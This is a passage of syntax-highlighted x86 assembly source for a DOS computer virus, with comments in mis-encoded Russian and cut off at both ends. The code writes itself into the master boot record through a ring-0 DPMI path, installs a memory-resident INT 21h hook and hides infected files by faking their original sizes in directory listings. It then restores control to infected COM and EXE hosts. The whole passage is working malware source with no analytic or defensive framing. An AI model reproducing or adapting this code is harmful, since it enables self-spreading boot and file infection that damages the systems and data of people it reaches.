        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;€¤à¥á £¤¥ ®à¨£. MBR á¥©ç á ­ å®¤¨âáï</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_mbr</span><span class="sc4">-</span><span class="sc5">begin_mbr</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">                     </span><span class="sc1">;‡ ­®á¨¬ ¢ ®à¨£. MBR ­ è.</span><span class="sc0">
        </span><span class="sc1">;¨è¥¬áï ­  MBR</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">DOS_MBR_write</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">prepare_to_protect_mode</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
        </span><span class="sc1">;¥p¥å®¤¨¬ ¢ § é¨é¥­­ë© p¥¦¨¬</span><span class="sc0">
        </span><span class="sc1">;H  ¢å®¤¥ âp¥¡ã¥âáï ES - p¨¢ â­ë© á¥£¬¥­â ¤«ï DPMI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0500h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">DPMI_call</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_goto_normal_programm</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">open_RING0_16prot_function</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">write_MBR_call</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">RING0_16prot_function</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">close_RING0_16prot_function</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">back_to_real</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">write_memory</span><span class="sc0">
</span><span class="sc5">DOS_MBR_write</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_MBR_call</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßßßß MEMORY WRITE ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc5">write_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">],</span><span class="sc2">31F5h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">manager_present</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">begin_manager</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">M_ADDR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">      </span><span class="sc1">; DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">install_int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">goto_normal_programm</span><span class="sc0">
</span><span class="sc5">manager_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">manager_idle_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">goto_normal_programm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">manager_idle_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">install_int21</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßß GO TO NORMAL PROGRAMM ßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc5">goto_normal_programm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">;EXE ä ©«</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">itis_EXE_file</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ COM ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">   </span><span class="sc1">;DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">turnoff_A20</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">itis_EXE_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">;Relo CS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">;Relo SS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">sp_correct</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">ss_correct</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">jump_correct</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">turnoff_A20</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">   </span><span class="sc1">;ŒV SP,CS:[XXXX]</span><span class="sc0">
</span><span class="sc5">sp_correct</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">08Eh</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">   </span><span class="sc1">;ŒV SP,CS:[XXXX]</span><span class="sc0">
</span><span class="sc5">ss_correct</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">jump_to_normal_programm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc0"> </span><span class="sc1">;JMP DWORD PTR CS:[]</span><span class="sc0">
</span><span class="sc5">jump_correct</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">turnoff_A20</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_turnoff_A20</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4310h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">himem_entrypoint</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">himem_entrypoint</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_himem</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">exit_turnoff_A20</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßß INT 21 PROCESSING ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc5">virus_int21_processing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_1</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;‡ ¤ ç  - ¯¥p¥­¥áâ¨ ¯ãâì ¤® ¨áª ¥¬ëå ä ©«®¢                                 ³</span><span class="sc0">
</span><span class="sc1">;DS:DX - ¯ãâì                                                              ;³</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_4F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:SI -&gt; ES:DI                                     ;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">function_4E_4F</span><span class="sc0">                                            </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">next_step_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_2</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;‘ªpë¢ ¥¬ ¤«¨­­ã, íâ® ¤«ï äã­ªæ¨© 4E ¨ 4F.                                 ;³</span><span class="sc0">
</span><span class="sc5">function_4E_4F</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                                  </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc1">;‚ëå®¤: ES:BX -  ¤p¥áá DTA                                         ;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_stealth</span><span class="sc0">                                          </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">]</span><span class="sc0">                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                                          </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">q_file_infected</span><span class="sc0">                                           </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_clc_stealth</span><span class="sc0">                                          </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">                                                        </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_4F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">seach_name_from_path</span><span class="sc0">                                      </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ˆ¬ï ä ©«                                     ;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                                                    </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">  </span><span class="sc1">;DS:SI -&gt; ES:DI                                    ;³</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_4F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">return_original_size_of_file</span><span class="sc0">                              </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_clc_stealth</span><span class="sc0">                                          </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                                            </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                                          </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">exit_clc_stealth</span><span class="sc4">:</span><span class="sc0">                                                          </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                                     </span><span class="sc1">;³   ;³</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc5">exit_stc_stealth</span><span class="sc4">:</span><span class="sc0">                                                          </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                                     </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                                                </span><span class="sc1">;³</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">next_step_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">714Eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_3</span><span class="sc0">
